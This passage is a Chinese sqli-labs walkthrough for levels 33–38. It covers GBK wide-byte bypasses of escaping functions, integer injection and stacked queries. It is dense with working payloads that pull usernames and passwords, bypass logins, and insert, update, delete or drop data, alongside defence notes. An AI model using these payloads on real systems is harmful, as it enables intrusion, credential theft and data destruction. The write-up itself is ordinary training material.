| 关键条件 | `SET NAMES gbk`（或等价 GBK 连接编码） |
| 与 Less-32 差异 | 32 多为自定义 `check_addslashes()`；33 直接调用 `addslashes()`，**绕过手法相同** |
| 主攻手法 | 宽字节：`%df'` 吃掉转义反斜杠 |

#### 源码逻辑（理解用）

```latex
$id = addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

1. 输入 `'` → 变成 `\'`（多字节 `0x5c 0x27`）。
2. 在 GBK 下，在 `'` 前加 `%df`，转义后出现 `%df%5c%27`。
3. GBK 把 `%df%5c` 当成一个汉字，反斜杠被“吃掉”，剩下的 `'` 重新闭合字符串。

#### 解题步骤

**1）普通单引号无效**

```latex
?id=1'
```

被 `addslashes` 转义后，通常无法形成有效注入。

![1790932067436-4ee86ba6-e4fa-464a-886a-f099f2f2a051.png](./img/285943702/1790932067436-4ee86ba6-e4fa-464a-886a-f099f2f2a051-484741.png)

**2）宽字节确认**

```latex
?id=1%df'
?id=1%df%27
```

出现 SQL 语法错误 → 宽字节绕过成功。

![1790932152316-697404a7-5aa9-4356-8b9b-4caa409ede5a.png](./img/285943702/1790932152316-697404a7-5aa9-4356-8b9b-4caa409ede5a-057816.png)

**3）注释与列数**

```latex
?id=1%df' --+
?id=1%df' order by 1--+
?id=1%df' order by 2--+
?id=1%df' order by 3--+
?id=1%df' order by 4--+
```

列数以本地最后一个成功的 `order by` 为准。

![1790932195332-fbd58884-e1a1-4943-9c2a-b38cbf762beb.png](./img/285943702/1790932195332-fbd58884-e1a1-4943-9c2a-b38cbf762beb-022683.png)

![1790932208880-1f59fd16-79d7-4ae4-b9cd-19dcf1a0e6d4.png](./img/285943702/1790932208880-1f59fd16-79d7-4ae4-b9cd-19dcf1a0e6d4-897529.png)

**4）联合查询**

```latex
?id=-1%df' union select 1,2,3--+
```

![1790932237433-ce810294-55a8-4514-b609-3c4b532ced62.png](./img/285943702/1790932237433-ce810294-55a8-4514-b609-3c4b532ced62-457100.png)

**5）取数据**

```latex
?id=-1%df' union select 1,database(),3--+
```

![1790932297140-89e60df5-ad24-4472-99b3-27d353285051.png](./img/285943702/1790932297140-89e60df5-ad24-4472-99b3-27d353285051-957831.png)

```latex
?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
```

注意此处数据库名要用十六进制 (HEX) 编码替代，避免单引号的使用。

MySQL 中 `table_name=0x7573657273` 等价于 `table_name='users'`（hex 字面量在字符串比较时自动转换），而且不含任何引号字符，addslashes 无从下手。

这里需要注意，不能出现单引号，于是我们在 users 前面加入 0x ，然后将 users 转化为16进制。

![1790931080654-2d2f3834-d16b-4681-b00c-c7293bb4806e.png](./img/285943702/1790931080654-2d2f3834-d16b-4681-b00c-c7293bb4806e-445736.png)

```latex
?id=-1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+
```

![1790932447339-46953e26-dfb3-45e1-80f2-7d06b453bccd.png](./img/285943702/1790932447339-46953e26-dfb3-45e1-80f2-7d06b453bccd-196297.png)

```latex
?id=-1%df' union select 1,group_concat(username,0x3a,password),3 from users--+
```

![1790932474304-d44bad51-0fa1-440f-af7e-8f7af03a6b1e.png](./img/285943702/1790932474304-d44bad51-0fa1-440f-af7e-8f7af03a6b1e-956704.png)

**6）报错注入备选**

```latex
?id=1%df' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

?id=1%df' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

?id=1%df' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),0x7e),1) --+

?id=1%df' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+
```

![1790932573630-0369e914-16b3-4221-9363-4bfe36d1596c.png](./img/285943702/1790932573630-0369e914-16b3-4221-9363-4bfe36d1596c-540628.png)

![1790932711066-d96ca26c-d804-4f41-8b18-8f4b014294a1.png](./img/285943702/1790932711066-d96ca26c-d804-4f41-8b18-8f4b014294a1-606910.png)

**7）与 Less-32 对照**

| 项目 | Less-32 | Less-33 |
| --- | --- | --- |
| 转义实现 | 自定义正则类 addslashes | 内置 `addslashes()` |
| 编码条件 | GBK | GBK |
| 绕过 | `%df'` / `%df%27` | 相同 |
| 后续注入 | 联合 / 报错 | 相同 |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 本质 | 与 32 相同：GBK 多字节吃掉 `\` |
| 函数名 | 换成官方 `addslashes()` 并不提高安全性（在错误编码下） |
| 防御 | 统一 UTF-8；`character_set_client=binary`；参数化查询 |

***

### Less-34：POST · 绕过 `addslashes()` · 宽字节注入（GBK）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-34/` |
| 注入方式 | **POST**（登录框，常见参数 `uname`、`passwd`） |
| 类型 | 字符型 + `addslashes()` 转义 |
| 关键条件 | 数据库连接为 **GBK** |
| 与 Less-33 差异 | 通道从 GET 改为 POST；原理仍是宽字节吃反斜杠 |
| 主攻手法 | 在 POST 体里对注入点使用 `%df'`（或 `%df%27`） |

#### 源码逻辑（理解用）

对 POST 的用户名/密码先 `addslashes`，再拼进类似：

```sql
SELECT ... WHERE uname='$uname' AND passwd='$passwd'
```

在 GBK 下，宽字节同样使 `\'` 中的 `\` 失效。注入点可能在 `uname` 或 `passwd`，以实测为准（常见在用户名或密码任一处构造均可，需看哪个进了带引号的条件）。

#### 解题步骤

**1）普通引号被转义**

表单提交：

```latex
uname=admin'
passwd=1
```

通常无法注入（或只表现为登录失败，无可用语法突破）。

![1790995178213-eaa7ebb2-cc0f-4242-b0bf-0524aee6d24c.png](./img/285943702/1790995178213-eaa7ebb2-cc0f-4242-b0bf-0524aee6d24c-791788.png)

**2）宽字节确认（用 Burp 改包）**

抓登录请求，修改 POST body，例如：

```http
uname=1%df'%20or%201%3d1%23&passwd=1&submit=Submit
```

或：

```http
uname=1%df' or 1=1#&passwd=1&submit=Submit
```

* 若能绕过登录或出现 SQL 错误 → 宽字节生效
* 注意：部分浏览器插件会把 `%` 再次编码成 `%25`，导致失败；**优先用 Burp Repeater**，保证 `%df` 以原始字节提交

![1790995653108-b2559db5-e56e-4771-919d-de6182e43aa7.png](./img/285943702/1790995653108-b2559db5-e56e-4771-919d-de6182e43aa7-246354.png)

![1790995591811-f3a6e4f0-114f-4d05-b0bd-87cd225432db.png](./img/285943702/1790995591811-f3a6e4f0-114f-4d05-b0bd-87cd225432db-918708.png)

密码框同理可测：

```http
uname=admin&passwd=1%df' or '1'='1&submit=Submit

uname=admin&passwd=1%df' or 1=1#&submit=Submit

uname=admin&passwd=1%df'%20or%201%3d1%23&submit=Submit
```

![1790995862624-2abe9b67-6c85-4eac-bcca-b0e34a8f4ca1.png](./img/285943702/1790995862624-2abe9b67-6c85-4eac-bcca-b0e34a8f4ca1-907886.png)

**3）联合查询（注意 POST 查询列数）**

本关 SELECT 字段数可能与 GET 关不同（有的环境只选 2 列）。先测：

```http
uname=-1%df' union select 1,2#&passwd=1&submit=Submit
uname=-1%df' union select 1,2,3#&passwd=1&submit=Submit
```

以不报“列数不匹配”且能回显的为准。

![1790995935152-bffa1990-681d-43aa-ae11-f77e186884c5.png](./img/285943702/1790995935152-bffa1990-681d-43aa-ae11-f77e186884c5-259338.png)

![1790995956445-c45ac650-9c35-41c7-931d-6c8c9749f443.png](./img/285943702/1790995956445-c45ac650-9c35-41c7-931d-6c8c9749f443-052748.png)

**4）取数据示例（按 2 列调整）**

```http
uname=-1%df' union select 1,database()#&passwd=1&submit=Submit

uname=-1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #&passwd=1&submit=Submit

uname=-1%df' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273 #&passwd=1&submit=Submit
```

```http
uname=-1%df' union select 1,group_concat(username,0x3a,password) from users#&passwd=1&submit=Submit
```

![1790996003470-4d30a815-3880-4c78-847d-881785839389.png](./img/285943702/1790996003470-4d30a815-3880-4c78-847d-881785839389-064337.png)

![1790996147066-180df147-fbe1-4f23-890d-700396eae13e.png](./img/285943702/1790996147066-180df147-fbe1-4f23-890d-700396eae13e-046730.png)

![1790996260443-4b3838aa-8a47-49a9-8a48-816ba1d848c8.png](./img/285943702/1790996260443-4b3838aa-8a47-49a9-8a48-816ba1d848c8-311764.png)

![1790996312269-6d63eba8-5f7c-4b0e-bc51-dc6869bb361f.png](./img/285943702/1790996312269-6d63eba8-5f7c-4b0e-bc51-dc6869bb361f-761534.png)

若为 3 列，则：

```http
uname=-1%df' union select 1,database(),3#&passwd=1&submit=Submit
```

**5）报错注入备选**

```http
uname=1%df' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&passwd=1&submit=Submit

uname=1%df' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #&passwd=1&submit=Submit

uname=1%df' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),0x7e),1) #&passwd=1&submit=Submit

uname=1%df' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from  users),0x7e),1) #&passwd=1&submit=Submit
```

![1790996559541-5674fce9-f356-4df7-b694-5c068e2a8265.png](./img/285943702/1790996559541-5674fce9-f356-4df7-b694-5c068e2a8265-476744.png)

![1790996834470-3370509c-1d8e-4b17-be51-1ec06decabc8.png](./img/285943702/1790996834470-3370509c-1d8e-4b17-be51-1ec06decabc8-635644.png)

**6）其它宽字节 / 编码变体**

| 写法 | 说明 |
| --- | --- |
| `%df'` / `%df%27` | 最常用 |
| `%bb%27`、`%a1%27` 等 | 部分环境也可用的高位字节 |
| 部分资料中的 UTF-16 相关编码 | 环境相关，失败时仍回到 `%df` |

**7）操作注意**

| 点 | 说明 |
| --- | --- |
| 工具 | Burp 改 POST，避免二次 URL 编码 |
| Content-Type | `application/x-www-form-urlencoded` |
| 注释 | POST 里 `#` 或 `--+` 均可试 |
| 回显 | 登录成功页的用户名/密码位，或报错信息 |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 32/33 | 同为宽字节绕过转义，本关是 **POST** |
| 关键 | `%df` 必须真正到达服务器，不能被编成 `%25df` |
| 列数 | POST 登录查询列数可能是 2，先 `union select` 试列数 |
| 防御 | 与 33 相同：编码统一、参数化，不依赖 `addslashes` 防注入 |

***

### Less-35：GET · 整型注入 · 转义形同虚设

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-35/?id=1` |
| 注入方式 | GET |
| 类型 | **数字型（整型）** |
| 过滤 | 仍可能对输入做 `addslashes` / 类似转义 |
| 典型 SQL 形态 | `SELECT * FROM users WHERE id=$id LIMIT 0,1`（**无引号**包裹 `$id`） |
| 主攻手法 | 直接 `and` / `union`，不依赖引号闭合；字符串字面量用十六进制 |

#### 源码逻辑（理解用）

```latex
$id = check_addslashes($_GET['id']);   // 或类似转义
mysql_query("SET NAMES gbk");          // 有的环境仍有
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

* `id` **没有**单引号/双引号包裹 → 这是整型注入。
* 转义主要影响 `'`、`"`、`\`；整型注入不靠引号闭合，转义几乎帮不上忙。
* 子查询里若写 `table_name='users'`，引号可能被转义，此时把 `'users'` 写成 `0x7573657273` 等十六进制即可。

#### 解题步骤

**1）区分字符型 / 数字型**

```latex
?id=1
?id=1'
?id=1"
```

* 加引号后仍“正常”或表现异常但不符合字符型报错规律时，结合：

```latex
?id=1 and 1=1
?id=1 and 1=2
```

真假回显不同 → 数字型注入成立。宽字节试 `1%df'` 若总不按字符型走，更应转向整型思路。

![1790997572357-03904b6f-a25a-4913-a76e-11d4801e7b24.png](./img/285943702/1790997572357-03904b6f-a25a-4913-a76e-11d4801e7b24-712919.png)

![1790997597173-c552f63b-c5fe-4035-ad1b-f5313ee385ce.png](./img/285943702/1790997597173-c552f63b-c5fe-4035-ad1b-f5313ee385ce-102006.png)

![1790997606631-4dffb3a3-d486-445a-bf83-7908760b3314.png](./img/285943702/1790997606631-4dffb3a3-d486-445a-bf83-7908760b3314-208763.png)

**2）判断列数**

```latex
?id=1 order by 1--+
?id=1 order by 2--+
?id=1 order by 3--+
?id=1 order by 4--+
```

以本地最后一个成功的数字为准。

![1790997662574-ce861015-6351-4975-8e22-db7139aa07b9.png](./img/285943702/1790997662574-ce861015-6351-4975-8e22-db7139aa07b9-150046.png)

![1790997678812-aabf9ad7-d265-45aa-bbdc-f1d4476063f9.png](./img/285943702/1790997678812-aabf9ad7-d265-45aa-bbdc-f1d4476063f9-494992.png)

**3）联合查询**

```latex
?id=-1 union select 1,2,3--+
```

![1790997723667-8b83c271-657c-49c4-9692-fc0eeb846542.png](./img/285943702/1790997723667-8b83c271-657c-49c4-9692-fc0eeb846542-972572.png)

**4）取库名**

```latex
?id=-1 union select 1,database(),3--+
```

![1790997778201-7334b096-3725-4ac4-b10c-49f4934d93e4.png](./img/285943702/1790997778201-7334b096-3725-4ac4-b10c-49f4934d93e4-928800.png)

**5）取表名（字符串条件用十六进制更稳）**

```latex
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
```

或：

```latex
?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+
```

（`0x7365637572697479` = `security`）

![1790997863185-88052bbe-73b1-4a2d-8545-ce4bf52bc91b.png](./img/285943702/1790997863185-88052bbe-73b1-4a2d-8545-ce4bf52bc91b-931258.png)

**6）取列名**

```latex
?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+
```

（`0x7573657273` = `users`）

![1790997975705-895c703b-8154-4c4e-9db2-c687907c59b7.png](./img/285943702/1790997975705-895c703b-8154-4c4e-9db2-c687907c59b7-861058.png)

**7）取数据**

```latex
?id=-1 union select 1,group_concat(username,0x3a,password),3 from users--+
```

![1790998010331-ac09f7f1-76ba-4eef-8531-3be840166d6a.png](./img/285943702/1790998010331-ac09f7f1-76ba-4eef-8531-3be840166d6a-752051.png)

**8）报错注入备选**

```latex
?id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),0x7e),1) --+

?id=1 and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+
```

![1790998066556-25a7582e-148c-4fcd-a748-6c30e22a41c8.png](./img/285943702/1790998066556-25a7582e-148c-4fcd-a748-6c30e22a41c8-333964.png)

![1790998142098-be4f2400-94dd-4bdf-a739-4e2e81b36cb4.png](./img/285943702/1790998142098-be4f2400-94dd-4bdf-a739-4e2e81b36cb4-754166.png)

![1790998191414-3a7197f0-328f-4559-a4de-94860457fcb0.png](./img/285943702/1790998191414-3a7197f0-328f-4559-a4de-94860457fcb0-816120.png)

![1790998235343-d8060fd4-6720-4965-9e50-bd665c47eb5c.png](./img/285943702/1790998235343-d8060fd4-6720-4965-9e50-bd665c47eb5c-976480.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 核心 | 无引号 → 整型注入，不必纠结宽字节闭合 |
| 转义 | 对 `id=1 union ...` 基本无影响 |
| 技巧 | 需要 SQL 字符串时用 `0x...` 十六进制，避免被转义的引号 |
| 教学意义 | 打破“所有注入都要先闭合引号”的惯性 |

***

### Less-36：GET · 绕过 `mysql_real_escape_string()` · 宽字节注入

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-36/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型（单引号）+ 转义 |
| 过滤函数 | `mysql_real_escape_string()` |
| 关键条件 | 源码中常有 `SET NAMES gbk`，且**未**把 client 固定为 binary / 未正确 `mysql_set_charset('gbk')` 时，宽字节仍可能成功 |
| 与 32/33 关系 | 转义函数换成 `mysql_real_escape_string`，手法仍是 `%df'` |
| 主攻手法 | 宽字节注入 |

#### 源码逻辑（理解用）

```latex
$id = mysql_real_escape_string($_GET['id']);  // 或封装后的 check 函数
mysql_query("SET NAMES gbk");
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

* `mysql_real_escape_string` 会转义 `'`、`"`、`\`、换行等。
* 在连接编码为 GBK、且函数未按连接字符集正确处理多字节时，`%df` + 转义产生的 `\` 仍可被当成一个汉字，单引号逃逸。
* 资料中常强调：若正确 `mysql_set_charset('gbk')` 后再转义，宽字节可能失效；本靶场源码配置下通常仍可按 32/33 方式打。

#### 解题步骤

**1）普通单引号被转义**

```latex
?id=1'
```

一般无法形成有效闭合。

![1791005681908-5ec5426f-db7b-4acf-9b6e-e4fc533cdee6.png](./img/285943702/1791005681908-5ec5426f-db7b-4acf-9b6e-e4fc533cdee6-986343.png)

**2）宽字节确认**

```latex
?id=1%df'
?id=1%df%27
```

出现 SQL 语法错误 → 宽字节可用。

![1791005703692-f844ae49-3397-4b88-80cb-ca57ba7c58e0.png](./img/285943702/1791005703692-f844ae49-3397-4b88-80cb-ca57ba7c58e0-411353.png)

**3）列数与联合**

```latex
?id=1%df' order by 1--+
?id=1%df' order by 2--+
?id=1%df' order by 3--+
?id=1%df' order by 4--+

?id=-1%df' union select 1,2,3--+
```

列数以本地为准。

![1791005854690-6b08619c-3653-4935-bcc4-ab5807205d2c.png](./img/285943702/1791005854690-6b08619c-3653-4935-bcc4-ab5807205d2c-884486.png)

![1791005866516-d1715f66-9e81-4f44-8946-b070274e8eed.png](./img/285943702/1791005866516-d1715f66-9e81-4f44-8946-b070274e8eed-765220.png)

![1791005889209-029b23da-3d17-44f2-b077-c890bd514c1e.png](./img/285943702/1791005889209-029b23da-3d17-44f2-b077-c890bd514c1e-380687.png)

**4）取数据**

```latex
?id=-1%df' union select 1,database(),3--+
```

```latex
?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
```

```latex
?id=-1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=0x7573657273--+
```

（表名也可用普通 `'users'`；若引号再被转义，改用十六进制。）

```latex
?id=-1%df' union select 1,group_concat(username,0x3a,password),3 from users--+
```

![1791005925162-3e397051-ff8d-4313-83db-13fe2730ba8b.png](./img/285943702/1791005925162-3e397051-ff8d-4313-83db-13fe2730ba8b-534371.png)

![1791006102715-54a9f5f2-2811-4835-87c3-77d500a1fe38.png](./img/285943702/1791006102715-54a9f5f2-2811-4835-87c3-77d500a1fe38-680624.png)

![1791006164491-801fed98-743f-42a4-bdb9-85aab2734b28.png](./img/285943702/1791006164491-801fed98-743f-42a4-bdb9-85aab2734b28-670954.png)

**5）报错注入备选**

```latex
?id=1%df' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

?id=1%df' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

?id=1%df' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),0x7e),1) --+

?id=1%df' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) --+
```

![1791006450500-06ef01a8-e838-4820-a183-f92d766c59bd.png](./img/285943702/1791006450500-06ef01a8-e838-4820-a183-f92d766c59bd-945434.png)

![1791006613550-dbb680aa-57a6-474d-b51d-b58e0f0be005.png](./img/285943702/1791006613550-dbb680aa-57a6-474d-b51d-b58e0f0be005-282021.png)

**6）与 32/33/35 对照**

| 关卡 | 转义 | id 是否加引号 | 主手法 |
| --- | --- | --- | --- |
| 32 | 自定义类 addslashes | 有 `'$id'` | `%df'` 宽字节 |
| 33 | `addslashes()` | 有 | `%df'` 宽字节 |
| 35 | 有转义但 **整型** | 无 | 直接 union，不用宽字节 |
| 36 | `mysql_real_escape_string()` | 有 | `%df'` 宽字节 |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 核心 | 字符型 + 转义 + GBK → 宽字节 |
| 与 35 | 35 不靠引号；36 必须先用 `%df` 逃逸引号 |
| 函数 | `mysql_real_escape_string` 不是在所有字符集配置下都绝对安全 |
| 防御 | 统一 UTF-8；参数化；正确设置连接字符集后再转义 |

***

### Less-37：POST · 绕过 `mysql_real_escape_string()` · 宽字节注入（GBK）

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-37/` |
| 注入方式 | **POST**（登录框，常见 `uname`、`passwd`） |
| 类型 | 字符型 + 转义 |
| 过滤函数 | `mysql_real_escape_string()`（对用户名、密码等） |
| 关键条件 | 连接编码为 **GBK**（源码中常见 `SET NAMES gbk`） |
| 与前后关关系 | 相对 Less-36：同为 `mysql_real_escape_string`，通道改为 POST；相对 Less-34：同为 POST 宽字节，函数从 `addslashes` 换成 `mysql_real_escape_string` |
| 主攻手法 | POST 体中使用 `%df'` / `%df%27` 宽字节 |

#### 源码逻辑（理解用）

对 POST 参数先 `mysql_real_escape_string`，再拼进：

```sql
SELECT ... WHERE uname='$uname' AND passwd='$passwd' ...
```

在 GBK 下，`%df` + 转义产生的 `\`（`%5c`）被当成一个汉字，单引号重新获得闭合能力，与 34/36 原理相同。

#### 解题步骤

**1）普通引号被转义**

```latex
uname=admin'
passwd=1
```

通常无法注入。

![1791007118730-f0c22ad2-a6ef-4a59-8a5e-9f9710413b07.png](./img/285943702/1791007118730-f0c22ad2-a6ef-4a59-8a5e-9f9710413b07-992392.png)

**2）宽字节确认（Burp 改包）**

```http
uname=1%df' or 1=1#&passwd=1&submit=Submit
```

或：

```http
uname=1%df%27 or 1=1#&passwd=1&submit=Submit
```

* 能绕过登录或出现 SQL 错误 → 宽字节成功
* **务必用 Burp**：避免前端插件把 `%` 编成 `%25`，导致 `%df` 失效

![1791007234762-6f712201-190b-44ab-9d05-2eb0264fc2c9.png](./img/285943702/1791007234762-6f712201-190b-44ab-9d05-2eb0264fc2c9-118412.png)

也可在 `passwd` 上试：

```http
uname=admin&passwd=1%df' or 1=1#&submit=Submit
```

![1791007534318-2d287141-8a47-4a2f-aa8d-863c3d7c1fe2.png](./img/285943702/1791007534318-2d287141-8a47-4a2f-aa8d-863c3d7c1fe2-865227.png)

**3）联合查询（先确认列数）**

本关 SELECT 字段数可能是 2 或 3，先试：

```http
uname=-1%df' union select 1,2#&passwd=1&submit=Submit
uname=-1%df' union select 1,2,3#&passwd=1&submit=Submit
```

![1791008010176-118034cb-b861-4e53-93da-6198b75359c8.png](./img/285943702/1791008010176-118034cb-b861-4e53-93da-6198b75359c8-097583.png)

![1791008287753-5fd82149-31fc-4818-9e95-caaa6eb4a296.png](./img/285943702/1791008287753-5fd82149-31fc-4818-9e95-caaa6eb4a296-462678.png)

**4）取数据示例**

两列时：

```http
uname=-1%df' union select 1,database()#&passwd=1&submit=Submit

uname=-1%df' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #&passwd=1&submit=Submit

```

```http
uname=-1%df' union select 1,group_concat(username,0x3a,password) from users#&passwd=1&submit=Submit
```

三列时把 `union select` 补足三列即可。

![1791008322309-e734a657-3651-4cce-a484-5bd6d4a6ec84.png](./img/285943702/1791008322309-e734a657-3651-4cce-a484-5bd6d4a6ec84-298697.png)

![1791008677317-d5e5b723-3821-4806-9f48-3c113c52b54c.png](./img/285943702/1791008677317-d5e5b723-3821-4806-9f48-3c113c52b54c-737159.png)

表名/库名若引号再被转义，可用十六进制：

```http
uname=-1%df' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273 #&passwd=1&submit=Submit
```

**5）报错注入备选**

```http
uname=1%df' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&passwd=1&submit=Submit

uname=1%df' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #&passwd=1&submit=Submit

uname=1%df' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),0x7e),1) #&passwd=1&submit=Submit

uname=1%df' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1) #&passwd=1&submit=Submit
```

![1791008912488-315ad107-4566-413a-a3e6-083b9446572c.png](./img/285943702/1791008912488-315ad107-4566-413a-a3e6-083b9446572c-662409.png)

![1791009221422-901491ed-43ab-41ae-afd6-8f6aa33d8f00.png](./img/285943702/1791009221422-901491ed-43ab-41ae-afd6-8f6aa33d8f00-227687.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 核心 | POST + `mysql_real_escape_string` + GBK → 宽字节 |
| 与 34 | 同为 POST 宽字节，转义函数不同，payload 形态相同 |
| 与 36 | 同为 `mysql_real_escape_string`，本关用 POST |
| 注意 | `%df` 必须原样到达服务器 |

***

### Stacked Injections 堆叠注入

### Less-38：GET · 堆叠注入（Stacked Queries）· 单引号字符型

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-38/?id=1` |
| 注入方式 | GET |
| 类型 | 字符型（单引号） |
| 核心考点 | **堆叠注入**：一条请求里执行多条 SQL |
| 关键 API | 后端使用 `mysqli_multi_query()`（支持 `;` 分隔的多语句） |
| 典型 SQL 形态 | `SELECT * FROM users WHERE id='$id' LIMIT 0,1` |
| 与普通联合注入 | 联合只能拼在同一条 SELECT 里；堆叠可在后面再执行 INSERT/UPDATE/DELETE/CREATE 等 |

#### 源码逻辑（理解用）

```latex
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
mysqli_multi_query($con, $sql);
```

* 以前关卡多用 `mysql_query` / `mysqli_query`，**一次只能跑一条语句**，`;` 后面会被忽略或报错。
* `mysqli_multi_query` 允许：

```sql
SELECT ... WHERE id='1'; INSERT INTO users ...;
```

闭合单引号并加分号后，即可追加任意语句。

#### 解题步骤

**1）确认字符型注入**

```latex
?id=1
?id=1'
?id=1' --+
```

`1'` 报错、`1'--+` 恢复正常 → 单引号闭合。

![1791010066897-3ae67a05-2493-491b-aeb0-6f3fa53d5aad.png](./img/285943702/1791010066897-3ae67a05-2493-491b-aeb0-6f3fa53d5aad-986980.png)

![1791010077585-483a3fab-3f34-4068-855a-534741bff6ed.png](./img/285943702/1791010077585-483a3fab-3f34-4068-855a-534741bff6ed-714324.png)

**2）确认支持堆叠（用可观察副作用验证）**

插入测试用户（字段以你库表结构为准，常见有 `id,username,password`）：

```latex
?id=1'; insert into users(id,username,password) values(38,'less38','less38')--+
```

再用正常查询或：

```latex
?id=-1' union select 1,username,password from users where username='less38'--+
```

能查到新用户 → 堆叠成功。

![1791010306847-d3c634b7-dd2c-47e5-8b49-80908c772984.png](./img/285943702/1791010306847-d3c634b7-dd2c-47e5-8b49-80908c772984-689630.png)

![1791010411994-e8db77fe-d385-4824-acda-fb6a4a0a7991.png](./img/285943702/1791010411994-e8db77fe-d385-4824-acda-fb6a4a0a7991-147043.png)

![1791010461045-def57fd5-e935-428c-8311-63f1d826796b.png](./img/285943702/1791010461045-def57fd5-e935-428c-8311-63f1d826796b-672091.png)

**3）建表 / 复制结构（演示堆叠能力）**

```latex
?id=1'; create table less38_copy like users--+
```

```latex
?id=1'; insert into less38_copy select * from users--+
```

随后用联合查询看 `information_schema` 或业务回显，确认新表存在。

```http
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
```

![1791010751606-bb6146e3-0081-4439-a937-68da3a5e6a58.png](./img/285943702/1791010751606-bb6146e3-0081-4439-a937-68da3a5e6a58-147808.png)

![1791010801535-473428e5-7d2a-439f-97b4-13f585c6552d.png](./img/285943702/1791010801535-473428e5-7d2a-439f-97b4-13f585c6552d-906019.png)

![1791011455438-2044b5a0-ac6a-4f33-8d6b-ae577a57c132.png](./img/285943702/1791011455438-2044b5a0-ac6a-4f33-8d6b-ae577a57c132-139122.png)

**4）传统联合取数（本关仍然可用）**

堆叠是考点，但不妨碍联合：

```latex
?id=1' order by 1 --+
?id=1' order by 2 --+
?id=1' order by 3 --+
?id=1' order by 4 --+

?id=-1' union select 1,database(),3--+
?id=-1' union select 1,group_concat(username,0x3a,password),3 from users--+
```

列数以本地 `order by` 为准。

![1791011531229-0bbc6391-ab5a-4178-84fb-2de2183faa13.png](./img/285943702/1791011531229-0bbc6391-ab5a-4178-84fb-2de2183faa13-022975.png)

![1791011589573-8eecee23-2131-4938-83b1-0e048ac3db07.png](./img/285943702/1791011589573-8eecee23-2131-4938-83b1-0e048ac3db07-328751.png)

**5）其它堆叠示例（仅限靶场）**

```latex
?id=1'; update users set password='hacked' where username='less38'--+
```

```latex
?id=1'; delete from users where username='less38'--+
```

删除表 less38_copy。

```latex
?id=1'; drop table less38_copy --+
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
```

练习后可在靶场首页 **Setup/resetDB** 恢复数据。

![1791011704357-e285f8f0-2cf6-4711-8f03-dc6e5e6f3437.png](./img/285943702/1791011704357-e285f8f0-2cf6-4711-8f03-dc6e5e6f3437-192379.png)

![1791011752768-712e741c-22f8-4917-8ebb-b95a50206fad.png](./img/285943702/1791011752768-712e741c-22f8-4917-8ebb-b95a50206fad-860744.png)

![1791011793893-1136aa80-b5db-434e-b238-7f4aec5e4def.png](./img/285943702/1791011793893-1136aa80-b5db-434e-b238-7f4aec5e4def-303713.png)

![1791011803290-e5111503-353b-46b7-a0c9-f98cb074b4d3.png](./img/285943702/1791011803290-e5111503-353b-46b7-a0c9-f98cb074b4d3-971780.png)

![1791011946193-e904a4dc-e035-4c0e-8d8a-dd93d57cc4ac.png](./img/285943702/1791011946193-e904a4dc-e035-4c0e-8d8a-dd93d57cc4ac-098853.png)

